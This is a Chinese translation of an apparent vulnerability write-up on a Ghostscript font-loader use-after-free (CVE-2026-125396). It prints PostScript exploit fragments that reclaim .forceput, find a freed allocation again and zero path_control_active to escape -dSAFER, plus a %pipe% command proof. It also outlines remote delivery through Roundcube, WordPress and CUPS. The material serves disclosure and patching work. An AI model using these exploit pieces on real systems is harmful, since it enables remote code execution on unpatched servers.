**AI 摘要**  
：pwn.ai 在 Ghostscript 的 Type 1 字体加载器里找到一处 use-after-free（CVE-2026-125396，CVSS 4.0 评分 8.5）：文档借错误处理器夺回 .forceput  
 特权写入，让全局字典在 restore 后仍持有指向已释放本地对象的引用，从而拿到 write-what-where 原语，在内存中直接关掉 -dSAFER  
 的原生路径检查，实现远程命令执行。实测覆盖 19 条应用路径（WordPress Core、Roundcube、Debian 13 CUPS、MediaWiki、Plesk 等），另触达 Google、Dropbox 等 7 项生产服务；远程链 5/5、本地转换 20/20 复现。根修复随 Ghostscript 10.08.0（2026-09-08）落地，但截至 11 月 12 日 Debian Bookworm 仍列为脆弱，Amazon Linux 与部分 SUSE 分支待定。  
  
这项研究值得放进「文件即攻击面」的谱系里读。本仓库 11 月译过 SVG／HTML Smuggling 姊妹篇，讲伪装成图片的载荷怎么骗过邮件网关、在浏览器里自我组装；这一篇是它在服务端的镜像：一份扩展名 .jpg  
 的 PostScript 文件，借着缩略图、预览、打印这些再日常不过的功能落进 Ghostscript，然后从解释器内部把沙箱拆掉。看点有三处：中段从字体辅助函数到内存原语的利用叙述极其克制——不猜任何地址，只顺着解释器自己的指针走；那张多应用、多入口的实测矩阵，每行都标了进程权限与复现率；结尾几张「修复到达了谁」的发行版清单，是给运维的现成对表材料。蓝队读者可先跳「修复到达了哪里」一节对表。  
  
我们此前对 ImageMagick 格式处理与安全策略的研究（前作https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday）已经表明：扩展名可信的文件（如 .jpg  
、.png  
）可能被交到一个意料之外的解释器手里。本文接着讲：我们如何在测试的大多数应用里都触达了 Ghostscript，如何利用其字体加载器中的一个内存破坏漏洞绕过 -dSAFER  
 沙箱，在广泛使用的软件中拿到远程命令执行。

由此产生两个相互关联的问题：通过应用的普通功能能触达哪些解释器？这些解释器能否安全处理我们送进去的文件？我们继续深入 Ghostscript 内部，找到了若干影响各异的独立漏洞，报告给 Artifex，并与受影响平台合作加固各自的文件处理。其中一些漏洞仍在修复中。  
  
本文聚焦其中较有趣的一个发现。**Upload2Shell**  
（现为 CVE-2026-125396https://www.cve.org/CVERecord?id=CVE-2026-125396）是 Ghostscript Type 1 字体加载器中的一处 use-after-free（释放后使用）。它给了我们一个 write-what-where 原语——既能选择写入的数据，也能选择它在原生内存中的落点。精心构造的文档可以利用这种控制篡改执行 -dSAFER  
 的状态，以渲染进程的身份运行命令。  
  
我们测试的几乎所有带文件上传的应用，都能被骗着把一个扩展名可信的文件交给 Ghostscript。裁剪图片、生成预览这类再平常不过的功能，都可能把解释器暴露出来。原语跑通之后，我们顺着这些转换路径反向回溯到它们的远程入口。  
## 一张图片上传如何触达 Ghostscript  
  
设想一个生成预览的 PHP 应用。代码调用 Imagick——ImageMagick 的 PHP 绑定；ImageMagick 选一个格式处理器，后者可能把渲染委托（delegate）给 Ghostscript 或其他解释器。上传端点自己不需要启动 gs  
，只要把文件交给一个会这么做的库就够了。  
  
我们那个 WordPress 形态的预览 proof（概念验证代码）通过 Imagick::readImage($input . '[0]')  
 触达了这个 delegate。文件名以 .pdf  
 结尾，字节内容却是 PostScript；ImageMagick 把它交给了运行在 -dSAFER  
 下的 Ghostscript。利用还需要一个 Type 1 字体文件：在这个 delegate 里，它把字体写到 currentpagedevice /OutputFile  
 中已授权的临时输出路径；另一个自包含变体则用 Ghostscript 的进程本地 %ram%  
 设备。两者都不需要服务器上预先存在字体文件。  
  
![CUPS 打印任务、Roundcube 缩略图与 WordPress 上传，各自把不可信内容交给 Ghostscript](https://mmbiz.qpic.cn/sz_mmbiz_png/JpU6JH8dicqXLSeTibFEvNB9P1B4m9Z61Kkwuk0KUudL7J2SFBePrhHMfKSONLhuqvicg23gxYmLMzbz55M0TE5ibBvZC6f3EeLxMvkFK2B8ia2E/640?wx_fmt=png&from=appmsg "")  
  
应用提供入口；最终由哪段代码处理文件，取决于它的渲染依赖。  
  
Ghostscript 也可以作为库被链进图像处理构建。这种形态下，解释器运行在现有进程内部，而不是以独立的 gs  
 命令出现。只在应用代码里找显式的 Ghostscript 调用，这两种间接调用都会漏掉。  
## 文件触达 Ghostscript 的常见方式  
  
应用不需要自己调用 gs  
。在我们单独做的解码器测试里，下面这些寻常的图像调用在收到 EPS 内容时都触达了 Ghostscript——哪怕文件名叫 .png  
。  
```
from PIL import Imagewith Image.open(uploaded_file) as image:    image.load()  # pixel decoding invoked Ghostscript for EPS content
```  
  
在我们的测试里，单独的 Image.open()  
 只做了文件识别；加载像素、裁剪或转换，才会启动渲染器。

解码器本身很关键。PHP GD、OpenCV、预编译 Sharp、Jimp、Java ImageIO 和 Go 标准库的图像解码器，面对这些输入都没有启动 Ghostscript。复制或存储文件也不会触发渲染；真正值得审视的，是后续的预览或转换那一步。  
  
Ghostscript 同时渲染 PDF 和 PostScript。PostScript 是一门图灵完备的页面描述语言，渲染一份 PostScript 文档就是在执行一段程序。Ghostscript 的 -dSAFER  
 沙箱限制这段程序的文件访问与命令执行。它类似 seccomp——都在约束不可信代码能做什么，但执行机制不同：-dSAFER  
 依赖解释器内部的检查，而不是内核强制的系统调用过滤。  
  
这仍让一个庞大的解释器暴露在攻击者控制的程序面前。就像 V8 这类 JavaScript 引擎一样，运行语言本身是预期行为；内存安全漏洞却可能让程序破坏运行它的引擎。攻击者可以把这段程序当成 PostScript 文件来开发和调试，然后通过一次普通上传投递进去。  
  
这些权限检查之所以重要，是因为渲染进程有它自己的权限：它的服务账户可能读得了应用文件、写得了磁盘、起得了别的程序。沙箱的职责就是不让一份不可信文档动用这些权限。加载字体，正是必须遵守这条边界的寻常渲染操作之一。  
## 一个握有特权的字体辅助函数  
  
GPT 5.6 Sol 与 @PaulosYibelo 合作，在 .putgstringcopy  
 中发现了这个问题——它是 Resource/Init/gs_fonts.ps  
 里的一个辅助函数。Ghostscript 有一部分字体加载是用 PostScript 自己实现的。这个辅助函数需要写入受保护的字体字典，于是用到了一个名为 .forceput  
 的内部操作。  
  
普通文档代码不该有这种能力。这个辅助函数经过 bind 并标记为 executeonly  
，防止实现被直接查看。但它仍然要执行，而特权写入之前有一个操作可能失败。相关序列是：  
```
dup length string copy.forceput setglobal
```  
  
第一行复制字符串；第二行执行受保护的写入并恢复分配模式。这个辅助函数没有先检查操作数类型是否符合预期。  
  
我们在 Fontmap  
 里注册了一个 Type 1 字体并用 findfont  
 加载。这个字体定义的是普通的 Courier 衍生字形，但它的加载代码能看到字体加载器的操作数栈。它把栈上的文件名字符串换成了一个本地数组。在全局转本地的分支里，length  
 运算和字符串分配都成功了；随后 copy  
 抛出 typecheck  
，因为源是个数组。  
  
文档的错误处理器返回时，栈已经为这个 bind 过的辅助函数里的下一个操作布置妥当。以下是我们 proof 中的关键片段：  
```
/LoaderOriginalTypecheck errordict /typecheck get deferrordict /typecheck {  userdict /LoaderTrapPhase known    { userdict /LoaderTrapPhase get } { false } ifelse  {    userdict /LoaderTrapPhase false put    pop pop pop pop pop    userdict /ForceTarget get    userdict /ForceKey get    userdict /ForceValue get  } { LoaderOriginalTypecheck } ifelse} bind put
```  
  
五个 pop  
 丢弃了失败的 copy  
、它的目标新字符串、我们替换进去的文件名、加载器的 /PathLoad  
 键和已加载的字体字典，把保存的分配模式布尔值留在栈上；我们选好的字典、键和值紧随其后。执行在 .forceput  
 处恢复；随后的 setglobal  
 消费掉那个布尔值。我们从头到尾没有直接调用那个隐藏操作符。  
  
一个实现细节，让这个失而复得的写入不止是改一个受保护字典。在 psi/zgeneric.c  
 里，.forceput  
 存值时会把 systemdict  
 临时当作本地字典，存完再恢复该字典的空间标志。因此，一个本地对象可以通过存储检查，进入一个能在后续 restore  
 中幸存的字典。  
### 引用比它指向的对象活得更久  
  
单凭一次受保护字典的写入，还解释不了原生代码执行。下一步破坏的是另一条规则：对象被回收之后，指向它的引用不得继续可用。  
  
PostScript 区分本地与全局虚拟内存。这里的「虚拟内存」指解释器的对象空间。save  
 记录本地内存状态；之后的 restore  
 丢弃自 save  
 以来创建的对象。全局对象可以在这次恢复中幸存。  
  
这构成一条生命周期约束：幸存的全局字典不得持有对本地对象的可用引用，因为 restore  
 会释放那个本地对象。否则本地空间恢复后，字典就指向了已回收的存储。  
  
我们夺回的写入，恰好能造出这种关系：  
```
Before restore  surviving global dictionary → local objectAfter restore  surviving global dictionary → freed storageAfter the allocation is reused  surviving global dictionary → live interpreter data                                 at the same address
```  
  
字典里的引用没变，变的是占据那个地址的东西。  
  
![一个错误暴露出特权写入；全局字典在 restore 释放本地对象后仍持其引用；分配被重用后拿到原生内存控制](https://mmbiz.qpic.cn/mmbiz_png/JpU6JH8dicqWy5VBe9RNUk5snVL4wSEpdYJib7nMdCBsR7ZrBAQZtTW4dfibGG5piaibLCXg3n5ZF6Gf1DmME7XI7V7TVJVN1gYiamks94OjC5Zlc/640?wx_fmt=png&from=appmsg "")  
  
use-after-free：字典的引用幸存，本地对象没有。分配被重用后，过期引用指向了活着的解释器内存。  
  
在碰原生内存之前，一个小探针先让重用变得可见。这段节选省略了字体设置和错误处理器；findfont  
 触发夺回的 .forceput  
，把一个本地数组放进 systemdict  
：  
```
/AttackSave save defuserdict /ForceValue 8 array putuserdict /ForceValue get 0 31337 put{ /GSLoaderProbe findfont pop } stopped popAttackSave restore8 array userdict exch /Replacement exch putuserdict /Replacement get 0 4242 putsystemdict /GS_FORCEPUT_DANGLING_ARRAY get 1 5151 putuserdict /Replacement get 1 get ==
```  
  
最后一次读来自 Replacement  
，写入走的却是 systemdict  
 里那个过期引用。如果被释放的分配得到重用，Replacement[1]  
 会读到 5151——两个引用落到了同一批字节上。  
  
原生 proof 用的是同一套思路：一条 2048 字节的悬垂字符串，加上一批新建的整数数组，每个整数都是 0x12345678  
。我们扫描过期字符串找 marker 的字节，把低字节从 0x78  
 改成 0x79  
，再去找变成 0x12345679  
 的活数组元素。这就定位了重叠的槽位；完全不需要猜绝对堆地址。  
  
在我们的 64 位构建上，一个 Ghostscript ref  
 占 16 字节：8 字节存类型、属性和大小，随后 8 字节存值或指针。我们保存了一个合法整数 ref 留作恢复用，又保存了一个合法可写字符串 ref 的头部当模板。然后我们把 currentdevice  
 放进重叠的数组槽位，通过悬垂字符串读出它真实的设备引用指针，把活 ref 改成覆盖该指针的临时字符串视图。这个字节视图让我们能顺着 Ghostscript 自己的指针走：  
```
ref +8: value.pdevice               → psi_device_refpsi_device_ref +0: device         → gx_devicegx_device +24: memory            → gs_memory_tgs_memory_t +208: gs_lib_ctx      → gs_lib_ctx_tgs_lib_ctx_t +8: core            → gs_lib_ctx_core_tgs_lib_ctx_core_t +156: path_control_active
```  
  
这些结构偏移描述的是被测 x86-64 构建；每个对象的地址都来自活着的解释器引用——这就是 proof 不依赖固定进程地址的原因。在动用文件或命令访问之前，我们把伪造的 ref 恢复成了原来的整数形态。  
## 在文档脚下改掉解释器  
  
我们用一次可逆的算术操作符篡改，在生产图像与文档管线中演示了原生控制：复制 16 字节的 mul  
 引用，取一个真实的 sub  
 引用，只替换活 mul  
 ref 偏移 8 处的 8 个指针字节；调用这同一个 ref 一次，再把原始 16 字节拷回去。这是一次 C 函数指针层面的改动，不是用 PostScript 定义一个新的 mul  
。  
  
返回页面记录了改动前、中、后的值：  
```
29 × 11, before:   31929 × 11, changed:   1829 × 11, restored: 319
```  
  
中间那个结果是 29 − 11。留档的 proof 输出还记录了 NATIVE_POINTER_OVERWRITE_MATCHED=true  
 和 NATIVE_DISPATCH_RESTORED=true  
。大多数报告里，我们用的是更简单的 proof：读取 /proc/version  
 并返回内容。算术测试证明原生控制到手；文件读取证明我们越过了 Ghostscript 的文件访问边界。  
### 从原生内存到命令  
  
同一个字节视图给了我们命令执行的目标：Ghostscript 的原生路径控制状态。顺着上面的指针链走完后，Target  
 就是覆盖 gs_lib_ctx_core_t  
 的伪造字符串视图。proof 里决定性的写入，是四个针对原生字节的 PostScript put  
 操作：  
```
Target 156 0 putTarget 157 0 putTarget 158 0 putTarget 159 0 put
```  
  
这些字节就是 path_control_active  
。proof 在写入前读到 1,0,0,0  
，写入后读到 0,0,0,0  
，随后确认 .currentpathcontrolstate  
 为 false。Ghostscript 命令行上的 -dSAFER  
 还在；它的原生文件路径检查，已经在内存里被关掉了。  
  
这不是唯一的检查。proof 先用夺回的 .forceput  
 把 PostScript 侧的 PermitFileWriting  
 列表设成 [ (*) ]  
。对 %pipe%  
 而言，parse_file_name()  
 还会参考缓存的 LockFilePermissions  
 标志。我们第三次加载字体，把这个受保护的用户参数强制写为 false，再用 save  
/restore  
 同步缓存值。留档的序列把这几道独立的闸门摆得清清楚楚：  
```
POSTSCRIPT_WRITE_PERMIT=[(*)]PATH_CONTROL_BYTES_BEFORE=1,0,0,0PATH_CONTROL_BYTES_AFTER=0,0,0,0PATH_CONTROL_OPERATOR_STATE=falseLOCK_FILE_PERMISSIONS_AFTER_RESTORE=false
```  
  
这次范围受限的 Debian 打印任务验证以这个命令 proof 收尾，只在 /var/tmp  
 写了一个 marker：  
```
(PIPE_RCE_STOPPED=) print{  (%pipe%printf POST_SAFER_UAF_PIPE_RCE > /var/tmp/GS_CUPS_PIPE_RCE)  (w) file closefile} stoppeddup ==
```  
  
调度器记录到 PIPE_RCE_STOPPED=false  
，marker 文件出现在打印服务器上。这里的 false 意味着 stopped  
 块正常执行完毕。命令以 uid=7(lp)  
——渲染器的账户——运行，而不是提交任务的那个人的身份。  
## 顺着文档回溯到网络  
  
解释器原语立住之后，下一个问题是：远程用户能在哪里投递这份文档？我们追踪了热门应用调用图像与 PDF 处理的方式。三个案例足以说明，入口可以有多不一样。  
### Roundcube  
  
攻击者只需给使用 Roundcube 服务器的某人发一封构造好的邮件，并让收件人查看这封信。发件人不需要 Roundcube 账户；收件人也不用点击或下载附件——显示邮件本身，就触发了跑出我们命令的服务端处理。  
  
我们的附件声明为 image/jpeg  
、命名为 quarterly-results.jpg  
，内容却是 PostScript。Roundcube 把它当图片，自动请求缩略图；缩略图路径把附件交给 ImageMagick，后者调起 Ghostscript。文档以 www-data  
 身份跑出我们的 proof 命令，顺便生成了缩略图。  
### WordPress  
  
WordPress 为上传的 PDF 生成预览时，我们触达了同一个 Ghostscript 解释器。在 WordPress Core 里，媒体上传权限就够了：Author 及以上角色默认都有。使用 WordPress 上传与预览函数的插件，暴露的是同一条路径。WordPress 的 CVE-2026-65640 公告（GHSA-8vr3-7mxf-gx8whttps://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8vr3-7mxf-gx8w）描述的，正是使用 Imagick 与 Ghostscript 的站点上的远程代码执行。在我们的 Linux 系统上，处理上传的就是这套栈。  
  
插件把这种处理暴露给了无账户访客。在 Forminator 里，我们用一个公开 PDF 字段，配置成把上传存进媒体库——这促使 WordPress 生成附件元数据，进入 Imagick 转换路径。Essential Addons for Elementor 的公开注册挂件，则通过它的上传字段提供了另一条路。两条链都以 Web 服务用户的身份跑出命令。文件到达渲染器之后，字体加载器漏洞就是同一个。  
### Debian 13  
  
我们还通过 Debian 13 及其他 Linux 发行版上的 CUPS 触达了 Ghostscript。在 Debian 13 上，我们向一个免认证接收任务的共享网络打印队列发送 IPP Print-Job  
。CUPS 把我们的 PostScript 文档交给 gstopdf  
，后者以 -dSAFER  
 启动发行版的 Ghostscript。命令在打印服务器上以 uid=7(lp)  
 运行。  
```
anonymous IPP Print-Job  → shared CUPS queue  → gstopdf → Ghostscript (-dSAFER)  → font-loader use-after-free  → native path control changed  → command executed on the host as uid=7(lp)
```  
  
我们的 RCE proof 执行了一条固定命令，在 /var/tmp  
 下写了个 marker。给队列加上认证，就能挡住未认证提交。不带凭据就接收网络打印任务的共享队列，把渲染器暴露给任何能连到它的人。  
  
Ghostscript 的 CVE 在 CVSS 4.0 下给这个解释器漏洞打了 8.5 分，评级用的是本地攻击向量。而我们的演示，是通过生产服务和本文描述的应用远程触达解释器的：CUPS 提供了可从网络利用的打印路径；Roundcube 提供了基于邮件的远程利用；WordPress 及其插件提供了可远程利用的上传路径。留档的测试表明这些链可复现。尽管解释器被归为本地攻击向量，攻击者可以远程投递利用。

## 概念验证（PoC）  
  
下面是前述原生操作符写入的完整自包含 PostScript proof。它把自己的 Type 1 字体写进 Ghostscript 的进程本地 %ram%  
 设备，触发字体加载器漏洞，重用被释放的分配，把一个活 mul  
 引用改成调用 sub  
，再恢复原始字节。不需要任何配套字体文件。完整源码 104 行，可从 poc-native-write.pdfhttps://pwn.ai/upload2shell/poc-native-write.pdf 下载。  
```
gs -dSAFER poc-native-write.pdf
```  
  
在五个全新进程中观察到：  
```
BEFORE=319HIJACKED=18RESTORED=319
```  
  
下面每一步都标注了它在完整文件中的行号。29 × 11  
 检查在写入前后都返回 319；指针被改期间返回 18，即减法的结果。这个 proof 演示的是原生内存控制；上文描述的命令执行链，改的则是 Ghostscript 的路径控制状态。  
- **第 05–29 行｜布置字体**  
：文件在 %ram%  
 里创建自己的 Type 1 字体；其 PostScript 主体为错误布置好加载器栈。  
  
- **第 31–54 行｜夺回写入**  
：typecheck  
 处理器给挂起的 .forceput  
 换上新操作数，restore  
 后 systemdict  
 里留着一个指向本地字符串的引用。  
  
- **第 56–85 行｜找到活别名**  
：填满 marker 的数组重用了被释放的分配。经过期字符串把 0x12345678  
 改成 0x12345679  
，即可识别出重叠的引用。

## 修复解释器与它的调用方  
  
Artifex 的第一个修复（commit 1484854ehttps://github.com/ArtifexSoftware/ghostpdl/commit/1484854e0c8ddfda1baa4ad4cd965b8a9790aa81）在 .putgstringcopy  
 可能于 copy  
 中失败之前检查操作数，关掉了我们用来夺回特权写入的那条错误路径。后续一个改动（commit e0421767https://github.com/ArtifexSoftware/ghostpdl/commit/e0421767e13627e75055bb44cb01486887c2f9e8）把这个辅助函数搬进 C，去掉了对 .forceput  
 的依赖。  
  
第一个补丁也解释了为什么这类操作一直难以移除——Artifex 早就在设法消除或尽量少用它。维护者的原话：  
> "it isn't easy to undo 30 years worth of assumptions in the code."（「想撤掉代码里沉淀了 30 年的假设，没那么容易。」）  
  
—— Ken Sharp，Artifex，见 bug 709684 的修复  
  
  
一个内部字体加载器，需要一种普通文档代码做不了的写入；一个错误把这份权限暴露给了文档，文档用它违反了对象生命周期规则。最终的内存破坏，依赖的是好几个不同层面上的假设。  
  
应用侧也有自己的机会打断这条链。WordPress 于 8 月 12 日在 7.0.4（发布说明https://wordpress.org/news/2026/08/wordpress-7-0-4-release/）中发布了 Core 缓解措施，并回移到较旧的受支持分支。它的应用 CVE 与 Ghostscript CVE 处理的是处理路径上的不同点位。CUPS 路径上，队列认证决定谁能提交文档；禁止渲染器启动 shell 的策略，则能限制解释器沦陷之后的破坏面。  
  
修复必须到达应用实际使用的那个渲染器。更新宿主操作系统，不会更新既有容器镜像或应用捆绑包里那份独立的 Ghostscript——宿主包换新之后，文档 worker 仍可能继续带着漏洞代码运行。  
  
应用加固同样能关掉一条通向解释器的路。Roundcube 的序列说明了操作顺序为什么重要：先生成缩略图再检查文件真实类型，等于把第一次解释权让给了渲染器。对每个下游服务，值得问的问题是：从提交的文件到渲染进程，这条路径上变了什么。  
## 修复到达了哪里  
  
Artifex 于 2026 年 9 月 8 日在 Ghostscript 10.08.0（发布页https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs10080）中发布了根修复。此后许多发行版都已跟进——要么直接上这个版本，要么以 backport 形式合入旧版本。Ubuntu 为七个发行版发布了修复；Debian 修补了 Trixie 及其开发分支。  
  
覆盖并不均匀。截至 11 月 12 日，Debian 仍把 Bookworm 列为脆弱，Amazon Linux 显示修复待定，若干 SUSE 分支仍处受影响或进行中状态。这些分支上的应用，只要文件处理路径触达受影响的 Ghostscript 包，就仍可能暴露这个漏洞。发行版名字响、或者最近修过另一个 Ghostscript CVE，都不足以证明这个漏洞已修复。  
  
下面几张表记录的是这个特定漏洞的包状态。旧版本号可能已含 backport 修复；已发布修复版本，也不代表每个应用或容器都已用上。

从应用顶端往下看，依赖问题很容易被漏掉。往下几层，一个文件可能进入某个从未出现在应用安全评审里的 PostScript 或其他解释器。只检查上传处理器是否接受可信文件类型的评审，会漏掉最终处理这些文件的代码里的漏洞；停在同一边界上的渗透测试，有同样的盲区。  
  
在这个 Type 1 问题之外，我们更大范围的 Ghostscript 审计还通过另外几个独立发现，触达了 Dropbox 及其他被隐名厂商的生产服务，每个项目都支付了最高赏金。获准公开技术细节后，它们的案例研究将逐一解释各自的根源与 proof。本系列既按产品组织，也按底层漏洞组织。  
  
WordPress 8 月 12 日发布缓解；Artifex 9 月 2 日写好 Ghostscript 修复、9 月 7 日提交、9 月 8 日发布 10.08.0；我们 9 月 17 日完成 Debian 网络 CUPS proof；Ghostscript CVE 于 11 月 9 日（美国东部时间）公布。  
  
**Debian 13 CUPS 链将是本系列第一个完整案例研究与 PoC。**  
 其余产品的拆解会陆续跟上，每篇包含构建环境、投递路径、利用结果与厂商响应；发布后我们会把链接补进上面的表格。  
  
我们预计其他研究者还会找到更多受影响的应用。值得看的地方，是文件被接受之后的处理：缩略图生成、元数据提取、文档导入、打印转换。每一步都可能把攻击者控制的文档，交给一个拥有发送方所没有的权限的进程。Upload2Shell 让文档自己用上了这份权限。
